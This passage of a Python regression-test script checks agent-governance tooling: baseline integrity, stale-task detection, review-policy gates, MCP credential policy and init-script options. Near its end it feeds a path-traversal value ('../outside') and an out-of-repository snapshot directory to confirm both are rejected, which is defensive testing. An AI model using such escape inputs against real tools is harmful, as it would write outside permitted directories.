        run([python, "scripts/agent_skill_opt.py", "verify-preflight", "--skill", "demo-skill", "--release-id", release_id], cwd=target)
        signal_scan = target / "skillflows" / "demo-skill" / "optimization" / "release-preflight" / release_id / "signal-scan.md"
        signal_scan_text = signal_scan.read_text(encoding="utf-8")
        for expected in (".agent/runlog.jsonl", ".agent/context/latest.md", ".agent/evals/latest.md"):
            if expected not in signal_scan_text:
                print(f"agent_skill_opt.py preflight did not scan {expected}", file=sys.stderr)
                print(signal_scan_text, file=sys.stderr)
                return 1
        run([python, "scripts/agent_skill_hygiene.py", "doctor"], cwd=target)
        hygiene_report = json.loads(run([python, "scripts/agent_skill_hygiene.py", "report", "--json"], cwd=target).stdout)
        if hygiene_report.get("schema") != "agent-skill-hygiene-report-v1":
            print("agent_skill_hygiene.py did not produce the expected report schema", file=sys.stderr)
            return 1
        if hygiene_report.get("policy", {}).get("canary_is_optional") is not True:
            print("agent_skill_hygiene.py inverted the optional canary policy", file=sys.stderr)
            print(json.dumps(hygiene_report.get("policy", {}), indent=2), file=sys.stderr)
            return 1
        hygiene_config = json.loads((target / ".agent" / "skill-hygiene.json").read_text(encoding="utf-8"))
        if hygiene_config.get("canary", {}).get("required") is not False:
            print("generated skill hygiene config does not explicitly mark canary as optional", file=sys.stderr)
            print(json.dumps(hygiene_config.get("canary", {}), indent=2), file=sys.stderr)
            return 1
        gc_report = json.loads(run([python, "scripts/agent_gc.py", "report", "--json"], cwd=target).stdout)
        if gc_report.get("schema") != "agent-governance-gc-report-v1" or gc_report.get("status") != "pass":
            print("agent_gc.py did not produce a clean governance report", file=sys.stderr)
            print(json.dumps(gc_report, indent=2), file=sys.stderr)
            return 1
        baselines_path = target / ".agent" / "baselines.json"
        baselines = json.loads(baselines_path.read_text(encoding="utf-8"))
        stale_snapshot_path = target / ".agent" / "baselines" / "stale-regression.json"
        stale_snapshot_path.write_text(
            json.dumps({"schema": "agent-verify-snapshot-v1", "created_at": "2025-01-01T00:00:00Z", "counts": {}, "findings": {}}, indent=2) + "\n",
            encoding="utf-8",
        )
        stale_entry = {
            "name": "stale-regression",
            "path": ".agent/baselines/stale-regression.json",
            "created_at": "2025-01-01T00:00:00Z",
            "lifecycle": "active",
            "sha256": hashlib.sha256(stale_snapshot_path.read_bytes()).hexdigest(),
        }
        baselines["snapshots"].append(stale_entry)
        baselines_path.write_text(json.dumps(baselines, indent=2) + "\n", encoding="utf-8")
        advisory_report = json.loads(run([python, "scripts/agent_gc.py", "report", "--json"], cwd=target).stdout)
        if advisory_report.get("counts", {}).get("warnings") != 1 or advisory_report.get("counts", {}).get("errors") != 0:
            print("stale active baseline did not remain an advisory GC warning", file=sys.stderr)
            print(json.dumps(advisory_report, indent=2), file=sys.stderr)
            return 1
        run([python, "scripts/agent_gc.py", "doctor"], cwd=target)
        advisory_score = json.loads(run([python, "scripts/agent_score.py", "score", "--json"], cwd=target).stdout)
        if advisory_score.get("dimensions", {}).get("governance_gc", {}).get("status") == "fail" or "governance_gc" in advisory_score.get("hard_fail_dimensions", []):
            print("advisory GC warning became a governance hard failure", file=sys.stderr)
            print(json.dumps(advisory_score.get("dimensions", {}).get("governance_gc", {}), indent=2), file=sys.stderr)
            return 1

        gc_config_path = target / ".agent" / "governance-gc.json"
        gc_config = json.loads(gc_config_path.read_text(encoding="utf-8"))
        gc_config["policy"]["fail_on_warning"] = True
        gc_config_path.write_text(json.dumps(gc_config, indent=2) + "\n", encoding="utf-8")
        run([python, "scripts/agent_gc.py", "doctor"], cwd=target, expect_ok=False)
        strict_score = json.loads(run([python, "scripts/agent_score.py", "score", "--json"], cwd=target, expect_ok=False).stdout)
        if "governance_gc" not in strict_score.get("hard_fail_dimensions", []):
            print("explicit GC fail_on_warning did not become a governance hard failure", file=sys.stderr)
            print(json.dumps(strict_score.get("dimensions", {}).get("governance_gc", {}), indent=2), file=sys.stderr)
            return 1
        gc_config["policy"]["fail_on_warning"] = False
        gc_config_path.write_text(json.dumps(gc_config, indent=2) + "\n", encoding="utf-8")

        stale_entry["lifecycle"] = "historical"
        stale_entry["retention_review"] = {
            "reviewed_at": "2026-08-12T00:00:00Z",
            "decision": "retain",
            "rationale": "Regression fixture retains immutable evidence.",
            "evidence": "docs/QUALITY.md",
        }
        baselines_path.write_text(json.dumps(baselines, indent=2) + "\n", encoding="utf-8")
        historical_report = json.loads(run([python, "scripts/agent_gc.py", "report", "--json"], cwd=target).stdout)
        if historical_report.get("status") != "pass":
            print("reviewed historical baseline remained stale", file=sys.stderr)
            print(json.dumps(historical_report, indent=2), file=sys.stderr)
            return 1
        stale_entry["last_reviewed_at"] = "2099-01-01"
        baselines_path.write_text(json.dumps(baselines, indent=2) + "\n", encoding="utf-8")
        future_active = json.loads(run([python, "scripts/agent_gc.py", "report", "--json"], cwd=target, expect_ok=False).stdout)
        if not any(item.get("kind") == "baseline_date" and "future" in item.get("summary", "") for item in future_active.get("findings", [])):
            print("future baseline last_reviewed_at did not fail closed", file=sys.stderr)
            return 1
        stale_entry.pop("last_reviewed_at")
        stale_entry["reviewed_at"] = "2099-01-01"
        baselines_path.write_text(json.dumps(baselines, indent=2) + "\n", encoding="utf-8")
        future_reviewed = json.loads(run([python, "scripts/agent_gc.py", "report", "--json"], cwd=target, expect_ok=False).stdout)
        if not any(item.get("kind") == "baseline_date" and "future" in item.get("summary", "") for item in future_reviewed.get("findings", [])):
            print("future baseline reviewed_at did not fail closed", file=sys.stderr)
            return 1
        stale_entry.pop("reviewed_at")
        stale_entry["retention_review"]["reviewed_at"] = "2099-01-01"
        baselines_path.write_text(json.dumps(baselines, indent=2) + "\n", encoding="utf-8")
        future_retention = json.loads(run([python, "scripts/agent_gc.py", "report", "--json"], cwd=target, expect_ok=False).stdout)
        if not any(item.get("kind") == "baseline_retention" and "future" in item.get("summary", "") for item in future_retention.get("findings", [])):
            print("future retention_review reviewed_at did not fail closed", file=sys.stderr)
            return 1
        stale_entry["retention_review"]["reviewed_at"] = "2026-08-12T00:00:00Z"
        baselines_path.write_text(json.dumps(baselines, indent=2) + "\n", encoding="utf-8")
        original_created_at = stale_entry["created_at"]
        stale_entry["retention_review"]["evidence"] = "docs/missing-retention-review.md"
        baselines_path.write_text(json.dumps(baselines, indent=2) + "\n", encoding="utf-8")
        invalid_retention = json.loads(run([python, "scripts/agent_gc.py", "report", "--json"], cwd=target, expect_ok=False).stdout)
        if invalid_retention.get("counts", {}).get("errors") != 1 or invalid_retention.get("findings", [{}])[0].get("kind") != "baseline_retention":
            print("missing historical retention evidence did not fail closed", file=sys.stderr)
            print(json.dumps(invalid_retention, indent=2), file=sys.stderr)
            return 1
        external_evidence = temp_root / "external-retention-review.md"
        external_evidence.write_text("external\n", encoding="utf-8")
        stale_entry["retention_review"]["evidence"] = os.path.relpath(external_evidence, target)
        baselines_path.write_text(json.dumps(baselines, indent=2) + "\n", encoding="utf-8")
        external_retention = json.loads(run([python, "scripts/agent_gc.py", "report", "--json"], cwd=target, expect_ok=False).stdout)
        if not any(item.get("kind") == "baseline_retention" and "repository-local" in item.get("summary", "") for item in external_retention.get("findings", [])):
            print("external existing retention evidence did not fail repository confinement", file=sys.stderr)
            print(json.dumps(external_retention, indent=2), file=sys.stderr)
            return 1
        stale_entry["retention_review"]["evidence"] = "docs/QUALITY.md"
        baselines_path.write_text(json.dumps(baselines, indent=2) + "\n", encoding="utf-8")
        stale_snapshot_path.write_text("tampered\n", encoding="utf-8")
        tampered_baseline = json.loads(run([python, "scripts/agent_gc.py", "report", "--json"], cwd=target, expect_ok=False).stdout)
        if tampered_baseline.get("counts", {}).get("errors") != 1 or tampered_baseline.get("findings", [{}])[0].get("kind") != "baseline_integrity":
            print("tampered historical baseline did not fail SHA-256 integrity", file=sys.stderr)
            print(json.dumps(tampered_baseline, indent=2), file=sys.stderr)
            return 1
        immutable_snapshot = run([python, "scripts/agent_verify.py", "snapshot", "--name", "stale-regression"], cwd=target, expect_ok=False)
        if "already exists" not in (immutable_snapshot.stdout + immutable_snapshot.stderr):
            print("duplicate snapshot name did not preserve immutable baseline evidence", file=sys.stderr)
            print(immutable_snapshot.stdout + immutable_snapshot.stderr, file=sys.stderr)
            return 1
        original_snapshot_dir = baselines["snapshot_dir"]
        baselines["snapshot_dir"] = os.path.relpath(temp_root / "external-baselines", target)
        baselines_path.write_text(json.dumps(baselines, indent=2) + "\n", encoding="utf-8")
        escaped_snapshot = run([python, "scripts/agent_verify.py", "snapshot", "--name", "escaped-regression"], cwd=target, expect_ok=False)
        if "escapes the repository" not in (escaped_snapshot.stdout + escaped_snapshot.stderr) or (temp_root / "external-baselines" / "escaped-regression.json").exists():
            print("external snapshot_dir was not rejected before mutation", file=sys.stderr)
            print(escaped_snapshot.stdout + escaped_snapshot.stderr, file=sys.stderr)
            return 1
        baselines["snapshot_dir"] = original_snapshot_dir
        baselines_path.write_text(json.dumps(baselines, indent=2) + "\n", encoding="utf-8")
        if stale_entry["created_at"] != original_created_at:
            print("baseline retention review rewrote the immutable creation timestamp", file=sys.stderr)
            return 1
        baselines["snapshots"] = [item for item in baselines["snapshots"] if item.get("name") != "stale-regression"]
        baselines_path.write_text(json.dumps(baselines, indent=2) + "\n", encoding="utf-8")
        stale_snapshot_path.unlink()
        run([python, "scripts/agent_gc.py", "doctor", "--fail-on-warning"], cwd=target)
        run([python, "scripts/agent_task.py", "doctor"], cwd=target)
        run(
            [
                python,
                "scripts/agent_task.py",
                "new",
                "regression-task",
                "--title",
                "Regression task",
                "--profile",
                "standard",
                "--risk",
                "medium",
            ],
            cwd=target,
        )
        run([python, "scripts/agent_task.py", "doctor"], cwd=target)
        if not (target / "docs" / "features" / "regression-task" / "01_REQUIREMENT_ANALYSIS.md").exists():
            print("feature stage documents were not created", file=sys.stderr)
            return 1
        requirement_gate = run([python, "scripts/agent_task.py", "update", "regression-task", "--stage", "plan"], cwd=target, expect_ok=False)
        if "requirements" not in (requirement_gate.stdout + requirement_gate.stderr):
            print("agent_task.py did not enforce the requirements interview gate", file=sys.stderr)
            print(requirement_gate.stdout + requirement_gate.stderr, file=sys.stderr)
            return 1
        run(
            [
                python,
                "scripts/agent_task.py",
                "update",
                "regression-task",
                "--requirements-status",
                "complete",
                "--shared-understanding",
                "Regression task scope is understood.",
                "--domain-glossary-updated",
                "--code-docs-cross-checked",
                "--decomposition-status",
                "complete",
                "--decomposition-summary",
                "Create the regression task, satisfy requirements, and enter plan with explicit next steps.",
                "--decomposition-next-task",
                "Move the task to plan after spec-stage review evidence is recorded.",
                "--decomposition-evidence-path",
                "docs/features/regression-task/04_DEVELOPMENT.md",
                "--decomposition-subtask",
                "Create regression task",
                "--decomposition-subtask",
                "Validate plan gate behavior",
                "--goal-raw",
                "User asked to exercise the regression task plan gate.",
                "--goal-refined",
                "Verify a standard regression task can enter plan only after requirements, goal contract, decomposition, and spec review evidence are present.",
                "--goal-refinement-rationale",
                "The fixture converts the broad regression task into a specific protected-stage gate check.",
                "--goal-confirmation-status",
                "agent_assumed",
                "--goal-objective",
                "Verify protected-stage gates for a standard task.",
                "--goal-outcome",
                "The task enters plan only after required evidence is complete.",
                "--goal-decision-summary",
                "Use a local regression task to exercise requirements, goal, decomposition, and stage-review gates.",
                "--goal-spec-change",
                "regression-fixture",
                "--goal-non-goal",
                "Do not test release publishing in this fixture.",
                "--goal-constraint",
                "Keep the fixture deterministic.",
                "--goal-success-evidence",
                "agent_task.py accepts the plan transition after required evidence is present.",
                "--goal-stop-condition",
                "Stop if plan can be entered without required evidence.",
            ],
            cwd=target,
        )
        spec_review_path = target / "docs" / "features" / "regression-task" / "spec-review.md"
        spec_review_path.write_text("# Spec Stage Review\n\n- Status: pass\n- Findings: none\n", encoding="utf-8")
        run(
            [
                python,
                "scripts/agent_task.py",
                "update",
                "regression-task",
                "--stage-review-stage",
                "spec",
                "--stage-review-status",
                "pass",
                "--stage-review-path",
                spec_review_path.relative_to(target).as_posix(),
                "--clear-stage-open-findings",
            ],
            cwd=target,
        )
        run([python, "scripts/agent_task.py", "update", "regression-task", "--stage", "plan"], cwd=target)
        run([python, "scripts/agent_verify.py", "doctor"], cwd=target)
        run([python, "scripts/agent_verify.py", "snapshot", "--name", "before-regression", "--fail-on-issue"], cwd=target)
        run([python, "scripts/agent_verify.py", "snapshot", "--name", "after-regression", "--fail-on-issue"], cwd=target)
        run(
            [
                python,
                "scripts/agent_verify.py",
                "compare",
                "--before",
                ".agent/baselines/before-regression.json",
                "--after",
                ".agent/baselines/after-regression.json",
            ],
            cwd=target,
        )
        tests_dir = target / "tests"
        tests_dir.mkdir(exist_ok=True)
        test_file = tests_dir / "test_agent_gov_regression.py"
        test_file.write_text("def test_agent_gov_regression():\n    assert True\n", encoding="utf-8")
        run([python, "scripts/agent_verify.py", "snapshot", "--name", "before-test-count", "--fail-on-issue"], cwd=target)
        test_file.unlink()
        run([python, "scripts/agent_verify.py", "snapshot", "--name", "after-test-count", "--fail-on-issue"], cwd=target)
        test_count_compare = run(
            [
                python,
                "scripts/agent_verify.py",
                "compare",
                "--before",
                ".agent/baselines/before-test-count.json",
                "--after",
                ".agent/baselines/after-test-count.json",
            ],
            cwd=target,
            expect_ok=False,
        )
        if "test_files" not in (test_count_compare.stdout + test_count_compare.stderr):
            print("agent_verify.py did not report a test-count baseline decrease", file=sys.stderr)
            print(test_count_compare.stdout + test_count_compare.stderr, file=sys.stderr)
            return 1
        test_file.write_text("def test_agent_gov_regression():\n    assert True\n", encoding="utf-8")
        artifacts_template = target / ".agent" / "templates" / "artifacts.json.tmpl"
        original_artifacts_template = artifacts_template.read_text(encoding="utf-8")
        artifacts_template.write_text('{"schema": "{{schema}}",\n', encoding="utf-8")
        template_check = run([python, "scripts/agent_verify.py", "doctor"], cwd=target, expect_ok=False)
        if "template_rendering" not in (template_check.stdout + template_check.stderr):
            print("agent_verify.py did not report invalid rendered JSON templates", file=sys.stderr)
            print(template_check.stdout + template_check.stderr, file=sys.stderr)
            return 1
        artifacts_template.write_text(original_artifacts_template, encoding="utf-8")
        classify = json.loads(
            run(
                [
                    python,
                    "scripts/agent_gc.py",
                    "classify",
                    "--category",
                    "script_gap",
                    "--summary",
                    "Regression classification",
                    "--promotion-target",
                    "scripts/agent_verify.py",
                ],
                cwd=target,
            ).stdout
        )
        if classify.get("category") != "script_gap":
            print("agent_gc.py classify did not return the recorded category", file=sys.stderr)
            return 1
        evolution = json.loads((target / ".agent" / "harness-evolution.json").read_text(encoding="utf-8"))
        if not evolution.get("incidents"):
            print("agent_gc.py classify did not append a harness-evolution incident", file=sys.stderr)
            return 1
        run([python, "scripts/agent_score.py", "doctor"], cwd=target)
        score_report = json.loads(run([python, "scripts/agent_score.py", "score", "--json"], cwd=target).stdout)
        for dimension in ("dev_map", "skill_hygiene", "harness_evolution", "mcp_policy", "governance_gc", "session_offload"):
            if dimension not in score_report.get("dimensions", {}):
                print(f"agent_score.py did not include {dimension}", file=sys.stderr)
                return 1
        run([python, "scripts/agent_score.py", "score", "--write"], cwd=target)

        review_policy_path = target / ".agent" / "review-policy.json"
        review_policy = json.loads(review_policy_path.read_text(encoding="utf-8"))
        review_policy["human_review"]["evidence_fields"].remove("high_risk_paths_checked")
        review_policy_path.write_text(json.dumps(review_policy, indent=2) + "\n", encoding="utf-8")
        missing_review_field_check = run([python, "scripts/agent_check.py"], cwd=target, expect_ok=False)
        missing_review_field_score = run([python, "scripts/agent_score.py", "score", "--json"], cwd=target)
        combined_review_output = (
            missing_review_field_check.stdout
            + missing_review_field_check.stderr
            + missing_review_field_score.stdout
            + missing_review_field_score.stderr
        )
        if "high_risk_paths_checked" not in combined_review_output:
            print("missing human review field was not reported", file=sys.stderr)
            print(combined_review_output, file=sys.stderr)
            return 1
        review_policy["human_review"]["evidence_fields"].append("high_risk_paths_checked")
        review_policy_path.write_text(json.dumps(review_policy, indent=2) + "\n", encoding="utf-8")
        run([python, "scripts/agent_check.py"], cwd=target)

        role_contracts_path = target / ".agent" / "role-contracts.json"
        role_contracts = json.loads(role_contracts_path.read_text(encoding="utf-8"))
        role_contracts["policy"]["finder_cannot_fix"] = False
        role_contracts_path.write_text(json.dumps(role_contracts, indent=2) + "\n", encoding="utf-8")
        role_contract_check = run([python, "scripts/agent_check.py"], cwd=target, expect_ok=False)
        role_contract_score = run([python, "scripts/agent_score.py", "score", "--json"], cwd=target, expect_ok=False)
        combined_role_output = (
            role_contract_check.stdout
            + role_contract_check.stderr
            + role_contract_score.stdout
            + role_contract_score.stderr
        )
        if "finder_cannot_fix" not in combined_role_output:
            print("role contract regression was not reported", file=sys.stderr)
            print(combined_role_output, file=sys.stderr)
            return 1
        role_contracts["policy"]["finder_cannot_fix"] = True
        role_contracts_path.write_text(json.dumps(role_contracts, indent=2) + "\n", encoding="utf-8")
        run([python, "scripts/agent_check.py"], cwd=target)

        task_board_path = target / ".agent" / "task-board.json"
        task_board = json.loads(task_board_path.read_text(encoding="utf-8"))
        task_board["items"].append(
            {
                "id": "stale-task",
                "title": "Stale task",
                "state": "active",
                "risk": "medium",
                "profile": "standard",
                "current_stage": "implementation",
                "docs_path": "docs/features/stale-task",
                "created_at": "2025-01-01T00:00:00Z",
                "updated_at": "2025-01-01T00:00:00Z",
                "delivery_conclusion": "",
                "review_gate": {
                    "required": True,
                    "status": "pending",
                    "latest_review": "",
                    "latest_fix": "",
                    "open_findings": [],
                    "accepted_exception": "",
                },
                "related_tasks": [],
            }
        )
        task_board_path.write_text(json.dumps(task_board, indent=2) + "\n", encoding="utf-8")
        gc_drift = run([python, "scripts/agent_gc.py", "doctor"], cwd=target, expect_ok=False)
        verify_drift = run([python, "scripts/agent_verify.py", "doctor"], cwd=target, expect_ok=False)
        score_drift = run([python, "scripts/agent_score.py", "score", "--json"], cwd=target, expect_ok=False)
        drift_output = gc_drift.stdout + gc_drift.stderr + verify_drift.stdout + verify_drift.stderr + score_drift.stdout + score_drift.stderr
        if "stale-task" not in drift_output or "governance_gc" not in score_drift.stdout:
            print("task-board drift did not propagate into governance scoring", file=sys.stderr)
            print(drift_output, file=sys.stderr)
            return 1
        task_board["items"] = [item for item in task_board["items"] if item.get("id") != "stale-task"]
        task_board_path.write_text(json.dumps(task_board, indent=2) + "\n", encoding="utf-8")
        run([python, "scripts/agent_check.py"], cwd=target)
        run([python, "scripts/agent_gc.py", "doctor", "--fail-on-warning"], cwd=target)
        run([python, "scripts/agent_verify.py", "doctor"], cwd=target)

        config_path.write_text('{"schema":"agent-project-config-v1","remote_workspace_path":"C:\\bad"\n', encoding="utf-8")
        doctor = run([python, "scripts/agent_score.py", "doctor"], cwd=target, expect_ok=False)
        score = run([python, "scripts/agent_score.py", "score", "--write"], cwd=target, expect_ok=False)
        combined_output = doctor.stdout + doctor.stderr + score.stdout + score.stderr
        if "project_integrity" not in combined_output and "invalid JSON" not in combined_output:
            print("invalid JSON was not reported as project integrity failure", file=sys.stderr)
            print(combined_output, file=sys.stderr)
            return 1

        existing = temp_root / "existing-layout"
        for directory in ("cmd", "pkg", "docs", "scripts"):
            (existing / directory).mkdir(parents=True, exist_ok=True)
        run(
            [
                python,
                str(INIT_SCRIPT),
                str(existing),
                "--layout",
                "existing",
                "--dir",
                "cmd,pkg",
                "--no-create-layout",
            ],
            cwd=PACKAGE_ROOT,
        )
        run([python, "scripts/agent_check.py"], cwd=existing)

        escaped = temp_root / "path-escape"
        escaped.mkdir(parents=True, exist_ok=True)
        escape_result = run(
            [python, str(INIT_SCRIPT), str(escaped), "--dir", "../outside"],
            cwd=PACKAGE_ROOT,
            expect_ok=False,
        )
        if "must not contain . or .." not in (escape_result.stdout + escape_result.stderr):
            print("path traversal in --dir was not rejected clearly", file=sys.stderr)
            print(escape_result.stdout, file=sys.stderr)
            print(escape_result.stderr, file=sys.stderr)
            return 1
        assert_existing_project_adoption(INIT_SCRIPT, temp_root, python)

        for profile in ("core", "standard"):
            profiled = temp_root / f"profile-{profile}"
            profiled.mkdir(parents=True, exist_ok=True)
            run(
                [
                    python,
                    str(INIT_SCRIPT),
                    str(profiled),
                    "--tech-stack",
                    "python",
                    "--layout",
                    "minimal",
                    "--remote-kind",
                    "local",
                    "--governance-profile",
                    profile,
                ],
                cwd=PACKAGE_ROOT,
            )
            run([python, "scripts/agent_check.py"], cwd=profiled)
            assert_no_missing_doc_refs(profiled)
            assert_workflow_stage_closure(profiled)
            assert_project_review_templates_are_profile_safe(profiled)
            run([python, "scripts/agent_migrate.py", "doctor"], cwd=profiled)
            run([python, "scripts/agent_score.py", "doctor"], cwd=profiled)
            score = json.loads(run([python, "scripts/agent_score.py", "score", "--json"], cwd=profiled).stdout)
            if score.get("status") != "pass":
                print(f"{profile} profile did not score pass", file=sys.stderr)
                print(json.dumps(score, indent=2), file=sys.stderr)
                return 1
            if profile == "core":
                assert_core_session_resume_is_profile_aware(profiled, python)
                if (profiled / "scripts" / "agent_verify.py").exists():
                    print("core profile unexpectedly generated agent_verify.py", file=sys.stderr)
                    return 1
            else:
                run([python, "scripts/agent_skill_hygiene.py", "doctor"], cwd=profiled)
                run([python, "scripts/agent_verify.py", "doctor"], cwd=profiled)
                run([python, "scripts/agent_gc.py", "doctor", "--fail-on-warning"], cwd=profiled)
                mcp_path = profiled / ".agent" / "mcp-policy.json"
                if not mcp_path.exists():
                    print("standard profile did not generate disabled MCP policy", file=sys.stderr)
                    return 1
                mcp_policy = json.loads(mcp_path.read_text(encoding="utf-8"))
                if mcp_policy.get("mode") != "optional-disabled-by-default":
                    print("standard profile MCP policy was not disabled by default", file=sys.stderr)
                    return 1
                for key in ("credentials_must_use_vault_or_proxy", "sandbox_must_not_receive_raw_credentials"):
                    if mcp_policy.get("policy", {}).get(key) is not True:
                        print(f"standard profile MCP policy missing {key}", file=sys.stderr)
                        return 1
                for boundary in ("credential_vault", "credential_proxy"):
                    if boundary not in mcp_policy.get("trust_boundaries", {}):
                        print(f"standard profile MCP policy missing {boundary}", file=sys.stderr)
                        return 1
                if "mcp_policy" not in score.get("dimensions", {}):
                    print("standard profile score did not include mcp_policy", file=sys.stderr)
                    return 1
                if "skill_hygiene" not in score.get("dimensions", {}):
                    print("standard profile score did not include skill_hygiene", file=sys.stderr)
                    return 1
                assert_global_skill_governance(profiled, python, temp_root)
        assert_task_board_guards(INIT_SCRIPT, temp_root, python)
    finally:
        shutil.rmtree(temp_root, ignore_errors=True)
    return 0


if __name__ == "__main__":
    raise SystemExit(main())
